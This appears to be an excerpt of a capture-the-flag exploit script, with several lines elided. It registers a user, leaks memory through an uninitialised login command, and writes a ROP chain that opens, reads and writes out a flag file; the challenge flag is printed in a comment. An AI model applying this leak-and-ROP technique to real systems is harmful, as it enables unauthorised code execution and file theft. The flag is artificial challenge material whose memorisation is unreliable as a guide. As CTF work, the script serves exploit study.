...
r.wait(0.1)
payload = p32(1) + b'\x00' * 0x20 + b'123\x00' + b'123\x00' # register new user 
...
r.wait(0.1)
payload = p32(2) + b'\x00' * 0x20 + b'123\x00' + b'123\x00'  ## leak using command_login (uninitialize)
...
rop_gadget = [
    pop_rdi_ret, stack+0x70, pop_rsi_ret, 0, pop_rdx_r12_ret, 0, 0, pop_rax_ret, 2, sys_ret, # open flag
    xchg_edi_eax_ret , pop_rsi_ret, code_base + 0x5830, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 0, sys_ret, # read flag
    pop_rax_ret, stack-0x1e4, mov_eax_ptr, xchg_edi_eax_ret, pop_rsi_ret, code_base + 0x5830, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 1, sys_ret, # write frontend
]
...
for i in rop_gadget:
    ...
    ret = 2
    while ret != 1 :
        ret = write_gadget(start_addr,0,i)[0] # make sure gadget write to bss 
    start_addr -= 8
...
print(b)# flag{Oh!!Y00000u_pwn_the_b@ck3nd_and_g0t_root!!}
r.interactive()